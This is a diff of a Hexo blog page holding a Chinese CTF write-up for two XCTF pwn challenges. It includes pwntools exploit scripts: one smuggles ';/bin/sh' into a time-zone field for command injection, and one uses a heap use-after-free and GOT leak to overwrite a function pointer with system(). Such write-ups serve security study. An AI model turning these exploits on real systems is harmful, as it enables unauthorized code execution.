@@ -1,86 +1,131 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    
-    <title>攻防世界高手进阶PWN（２） | Whali3n51&#39;s blog</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    
-      <link rel="icon" href="/favicon.png">
-    
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    <link rel="stylesheet" href="/css/style.css">
+  
 
-    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+  
 
-  <link rel="alternate" href="/atom.xml" title="Whali3n51's blog" type="application/atom+xml">
+  
+    <meta name="author" content="Whali3n51">
+  
+
+  
+
+  
+
+  <title>攻防世界高手进阶PWN（２） | Whali3n51&#39;s blog</title>
+
+  
+
+  
+    <link rel="icon" href="/logo.jpg">
+  
+
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+    <link href="https://cdn.bootcss.com/highlight.js/9.15.6/styles/monokai.min.css" rel="stylesheet">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="alternate" href="/atom.xml" title="Whali3n51's blog" type="application/atom+xml">
 </head>
-
-  <body>
-
-<header>
-	<a id="logo" href="/" title="Whali3n51&#39;s blog">
-	<img src="/favicon.png" alt="Whali3n51&#39;s blog"></a>
-	
-	
-		<!--搜索栏-->
-		<i class="js-toggle-search iconfont icon-search"></i>
-
-
-<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
-	<div class="search-form__inner">
-		<div>
-			<i class="iconfont icon-search"></i>
-			<input class="text-input" placeholder="Enter Key..." type="search">
-		</div>
-	</div>
-</form>
-	
-
-	
-		<!--侧边导航栏-->
-		<a id="nav-toggle" href="#"><span></span></a>
-
-<nav>
-	<div class="menu-top-container">
-		<ul id="menu-top" class="menu">
-			
-				
-				<li class="current-menu-item">
-					<a href="http://weibo.com/" target="_blank">Weibo</a>
-				</li>
-			
-		</ul>
-	</div>
-</nav>
-	
-
+<body>
+  <div id="container">
+    <!-- header -->
+<header class="header">
+  <div class="header-navbar">
+    <div class="header-navbar-left">
+      <h1 class="header-navbar-logo">
+        <a href="/">
+          
+            <img src="/css/images/logo.png" alt="Whali3n51&#39;s blog" />
+          
+        </a>
+      </h1>
+    </div>
+    <div class="header-navbar-right">
+      <div class="header-navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="header-navbar-list">
+        
+          <li class="header-navbar-item"><a href="/">Home</a></li>
+        
+          <li class="header-navbar-item"><a href="/about">About</a></li>
+        
+          <li class="header-navbar-item"><a href="/links">Link</a></li>
+        
+          <li class="header-navbar-item"><a href="/tags">Tags</a></li>
+        
+          <li class="header-navbar-item"><a href="/categories">Categories</a></li>
+        
+      </ul>
+    </div>
+  </div>
 </header>
-<div class="m-header ">
-	<section id="hero1" class="hero">
-		<div class="inner">
-		</div>
-	</section>
-	
-		<figure class="top-image" data-enable=true></figure>
-	
+
+    <section id="main"><!-- 文章详情页 -->
+
+
+<!-- banner container -->
+<div class="banner-container">
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    
+      <div class="banner-content post-content no-post-image">
+        <div class="post-text">
+          <div class="type-wrap">
+            <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+          </div>
+          <h1 class="title-wrap">攻防世界高手进阶PWN（２）</h1>
+          <h2 class="title-sub-wrap">
+            <strong>Whali3n51</strong>
+            <span>发布于</span>
+            
+  <a href="javascript:;" target="_blank" rel="noopener" class="article-date">
+    <time datetime="2019-09-01T03:09:00.000Z" itemprop="datePublished">2019-09-01</time>
+  </a>
+
+          </h2>
+        </div>
+      </div>
+    
+  
+
+  
+  
+
 </div>
 
-<!--文章列表-->
-<div class="wrapper">
-  
-    <!--文章-->
-<article>
-	
-  
-    <h1 class="post-title" itemprop="name">
-      攻防世界高手进阶PWN（２）
-    </h1>
-  
+<!-- 文章内容 -->
 
-	<div class='post-body mb'>
-		<p>懒得写思路，就写一些关键的思路和该注意的地方，最近做的题都没总结。今天就好好总结一下。</p>
+<div class="body-container">
+  <article id="article-container" class="main-container article-container">
+    <div class="article-content">
+      
+      
+
+      <div class="article-entry">
+        <p>懒得写思路，就写一些关键的思路和该注意的地方，最近做的题都没总结。今天就好好总结一下。</p>
 <h2 id="time-format"><a href="#time-format" class="headerlink" title="time format"></a>time format</h2><p>没什么好说的,easy.但是我觉得好的思路就是学会用’;’来分割参数</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('111.198.29.45',53977)</span></span><br><span class="line">p=process(<span class="string">'./time_format'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./time_format'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_format</span><span class="params">(content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Format: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_value</span><span class="params">(content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Time zone: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_format</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Are you sure you want to exit (y/N)? '</span>,<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">set_format(<span class="string">"%c"</span>)</span><br><span class="line">set_value(<span class="string">"\'"</span>+<span class="string">";/bin/sh #"</span>+<span class="string">"\\"</span>)</span><br><span class="line"></span><br><span class="line">delete_format()</span><br><span class="line">gdb.attach(p)</span><br><span class="line">set_value(<span class="string">"\'"</span>+<span class="string">";/bin/sh #"</span>+<span class="string">"\\"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line"><span class="comment">#delete_format()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -97,122 +142,184 @@
 
 <h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>你能相信这一题没给二进制文件吗。我真的是醉了，越往后面做就觉得主办方越来越不用心。这一题我在搜素引擎上找到了。他将一个用来打印的函数放在堆上，这个放打印函数的chunk为fastbin,而且这一题存在UAF漏洞。我们只需要巧妙的控制fastbin的分配，我们就能得到这个存放chunk。这个时候我们保持这个地址不变，泄露出got表，确定服务器的libc和libc_base。然后释放后重新分配，然后把打印函数地址改为system地址。但是这里要注意的事参数要用’;’分割，因为传进去的参数是我们存放system地址的地址。所以用’;bin/sh’，其中’;’用来分割。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./hacknote')</span></span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>, <span class="number">40750</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Note size :"</span>,str(size))</span><br><span class="line">	p.sendafter(<span class="string">"Content :"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice :"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x78</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xc</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x20</span>,p32(<span class="number">0</span>)+p32(<span class="number">0</span>))<span class="comment">#2</span></span><br><span class="line">payload=p32(<span class="number">0x0804862b</span>)+p32(<span class="number">0x804A010</span>)</span><br><span class="line">create(<span class="number">0xc</span>,payload)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">printf_addr=u32(p.recv(<span class="number">4</span>))-libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(<span class="string">'main_addr====&gt;0x%x'</span>%printf_addr)</span><br><span class="line"></span><br><span class="line">system_addr=printf_addr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0xc</span>,p32(system_addr)+<span class="string">';bin/sh\x00'</span>)<span class="comment">#4</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-	</div>
-	<div class="meta split">
-		
-			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
-		
-		<time class="post-date" datetime="2019-09-01T03:09:00.000Z" itemprop="datePublished">2019-09-01</time>
-	</div>
-</article>
+      </div>
 
-<!--评论-->
+      <div class="article-footer">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UAF/" rel="tag">#UAF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack-overflow/" rel="tag">#stack_overflow</a></li></ul>
+      </div>
 
-	
-<div class="ds-thread" data-thread-key="攻防世界高手进阶PWN(2)" data-title="攻防世界高手进阶PWN（２）" data-url="http://Whali3n51.github.io/2019/09/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6PWN(2)/"></div>
+      <div class="article-navs">
+        
+<nav class="card-container card-article-nav">
+  <div class="card-wrap">
+    
+      <div id="article-nav-newer" class="card-item">
+        <article>
+          
+          <a class="card-link article-nav-link" href="/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"></a>
+          <strong class="article-nav-caption">Newer</strong>
+          <p class="article-nav-title">
+            
+              five空间大赛
+            
+          </p>
+        </article>
+      </div>
+    
+    
+      <div id="article-nav-older" class="card-item">
+        <article>
+          
+          <a class="card-link article-nav-link" href="/2019/08/30/%E5%85%B3%E4%BA%8EWin10%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B01903%E4%B9%8B%E5%90%8E%E5%8F%AA%E8%83%BD%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/"></a>
+          <strong class="article-nav-caption">Older</strong>
+          <p class="article-nav-title">
+            
+              关于Win10自动更新1903之后只能新建文件夹
+            
+          </p>
+        </article>
+      </div>
+    
+  </div>
+</nav>
+
+      </div>
+      
+      
+
+  
+  <div class="valine-container">
+    <div id="valine_thread" class="valine-thread"></div>
+  </div>
+
+  
+  
+
+
+    </div>
+  </article>
+</div></section>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    <p>&copy; 2020 <a href="/" target="_blank">Whali3n51</a></p>
+
+    
+      <p id="hitokoto"></p>
+      <script src="https://v1.hitokoto.cn/?c=f&amp;encode=js&select=%23hitokoto" defer></script>
+    
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank">flex-block</a></p>
+  </div>
+</footer>
+  </div>
+
+  
+  
+
+
+  <!-- aplayer 音频 start -->
+  <link rel="stylesheet" href="/lib/APlayer.min.css">
+  <script src="/lib/APlayer.min.js"></script>
+  <script type="text/javascript">
+    const aplayer = document.querySelectorAll(".aplayer");
+    aplayer && initaplayer(aplayer);
+    function initaplayer(els) {
+      let elsArr = Array.from(els);
+      elsArr.forEach(el => {
+        new APlayer({
+          container: el,
+          audio: { ...el.dataset },
+          theme: "#b7daff",
+          lrcType: 3,
+          autoplay: false,
+          loop: false,
+          mutex: true,
+        });
+      });
+    }
+  </script>
+  <!-- aplayer 音频 end -->
+  
+
+<!-- dplayer 视频 start -->
+<link rel="stylesheet" href="/lib/DPlayer.min.css">
+<script src="/lib/DPlayer.min.js"></script>
+<script type="text/javascript">
+  const dplayer = document.querySelectorAll(".dplayer");
+  dplayer && initDPlayer(dplayer);
+  function initDPlayer(els) {
+    let elsArr = Array.from(els);
+    elsArr.forEach(el => {
+      let url = el.dataset.url;
+      let cover = el.dataset.cover;
+      new DPlayer({
+        container: el,
+        video: { url: url, pic: cover },
+        theme: "#b7daff",
+        autoplay: false,
+        loop: false,
+        mutex: true,
+      });
+    });
+  }
+</script>
+<!-- dplayer 视频 end -->
+
+
+<!-- waterfall 瀑布流 start -->
+<script src="/lib/waterfall.min.js"></script>
 <script type="text/javascript">
 
-var duoshuoQuery = {short_name:"yumemor"};
-	(function() {
-		var ds = document.createElement('script');
-		ds.type = 'text/javascript';ds.async = true;
-		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-		ds.charset = 'UTF-8';
-		(document.getElementsByTagName('head')[0]
-		 || document.getElementsByTagName('body')[0]).appendChild(ds);
-	})();
+const waterfalls = document.querySelectorAll(".waterfall-container");
+
+if (waterfalls && waterfalls.length > 0) {
+  waterfalls.forEach((waterfall, index) => {
+    let cls = "waterfall-container-" + index;
+    waterfall.classList.add(cls);
+    initWaterfall(cls, waterfall);
+  });
+}
+
+function initWaterfall(selector, el) {
+  const options = {};
+  if (Object.keys(el.dataset).length > 0) {
+    for (let k in el.dataset) {
+      options[k] = el.dataset[k];
+    }
+  }
+  waterfall(`.${selector}`, options);
+}
 </script>
+<!-- waterfall 瀑布流 end -->
+
+
+  <!-- zoom start -->
+  <script src="/lib/zoom.min.js"></script>
+  <script type="text/javascript">
+    document.querySelector(".article-content") && zoom(".article-content");
+  </script>
+  <!-- zoom end -->
+  
+
 
 
   
-</div>
 
-
-  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
-    <path d="M0 0 L50 100 L100 0 Z"></path>
-  </svg>
 
   
 
 
-  <div class="wrapper"></div>
+  
 
 
 
+<script src="/js/script.js"></script>
+  
+  <!-- 尾部用户自定义相关内容 -->
 
-
-<div class="fat-footer">
-	<div class="wrapper">
-		<div class="layout layout--center">
-			<div class="layout__item palm-mb">
-				<div class="media">
-					<img class="headimg" src='https://imgchr.github.la/steve.jpeg' alt='Whali3n51'>
-					<div class="media__body">
-						<h4>justpsvm</h4>
-						<p class='site-description'>Stay Hungry,Stay Foolish.</p>
-					</div>
-				</div>
-				<div class="author-contact">
-					<ul>
-						
-							
-							<li>
-				        		<a href="http://weibo.com/" target="_blank">
-				        			
-				        				<i class="iconfont icon-weibo"></i>
-				        			
-				        		</a>
-				        	</li>
-						
-							
-							<li>
-				        		<a href="https://github.com/" target="_blank">
-				        			
-				        				<i class="iconfont icon-github"></i>
-				        			
-				        		</a>
-				        	</li>
-						
-							
-							<li>
-				        		<a href="https://www.zhihu.com/" target="_blank">
-				        			
-										<i class="iconfont icon-zhihu"></i>
-				        			
-				        		</a>
-				        	</li>
-						
-					</ul>
-				</div>
-			</div>
-		</div>
-	</div>
-</div>
-
-<footer class="footer" role="contentinfo">
-	<div class="wrapper wrapper--wide split split--responsive">
-		
-			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
-		
-		<span>Theme by <a href="http://github.com/justpsvm" target="_blank" rel="noopener">justpsvm</a>. Powered by <a href="http://hexo.io" target="_blank" rel="noopener">Hexo</a></span>
-	</div>
-</footer>
-
-	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
-	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
-	<script src="/js/lib.js"></script>
-	<script src="/js/google-code-prettify/prettify.js"></script>
-	<script src="/js/module.js"></script>
-	<script src="/js/script.js"></script>
-	
-		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-	
-	<script type='text/javascript'>
-		//代码高亮
-		$(document).ready(function(){
-	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
-   			prettyPrint();
-		});
-	</script>
-	</body>
+</body>
 </html>
